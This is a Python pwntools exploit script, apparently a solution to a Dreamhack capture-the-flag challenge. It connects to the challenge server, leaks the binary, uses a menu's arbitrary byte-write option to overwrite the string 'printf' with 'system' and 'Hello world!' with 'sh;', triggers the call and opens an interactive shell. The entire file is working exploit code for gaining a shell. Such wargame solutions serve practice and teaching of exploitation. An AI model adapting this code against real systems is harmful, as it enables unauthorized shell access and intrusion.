#!/usr/bin/python3
from pwn import *

p = remote('host3.dreamhack.games', 14967)
sleep(2)
p.sendlineafter(b'>> ',b'1')
p.sendlineafter(b'>> ',b'B')

p.recvuntil(b'')
binary = str(p.recvuntil(b'----------Binary end')[:-20])

index1 = binary.index("printf")
index2 = binary.index("Hello world!")
print("index: ",index1)
print("index: ",index2)
sh = 0x2004
system = 0x492

sh_ord = "sh;"
system_ = "system"
def write(position,char):
    p.sendlineafter(b">> ",b'3')
    p.sendlineafter(b': ',str(position))
    p.sendlineafter(b' : ',b'y')
    p.sendlineafter(b': ',str(char))
def execute():
    p.sendlineafter(b'>> ',b'4')
for i in range(6):
    write(system+i,ord(system_[i]))
for i in range(3):
    write(sh+i,ord(sh_ord[i]))
execute()

p.interactive()
